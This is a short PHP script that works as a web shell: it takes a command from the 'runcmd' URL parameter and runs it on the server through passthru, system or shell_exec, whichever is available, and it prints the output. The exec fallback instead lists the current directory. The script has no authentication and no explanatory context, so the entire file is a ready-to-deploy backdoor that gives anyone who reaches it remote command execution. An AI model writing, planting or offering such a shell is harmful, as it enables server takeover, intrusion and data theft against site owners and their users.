<?php
$cmd = $_GET['runcmd'];

if(function_exists('passthru'))
{
	passthru($cmd);
}
else
{
	if(function_exists('exec'))
	{
		exec("ls -la",$result);
		foreach($result as $output)
		{
			print $output."<br>";
		}
	}
	else
	{
		if(function_exists('system'))
		{
			system($cmd);
		}
		else
		{
			if(function_exists('shell_exec'))
			{
				print shell_exec($cmd);
			}
			else
			{
				print "Sorry, none of the command functions works.";
			}
		}
	}
}
exit;
?>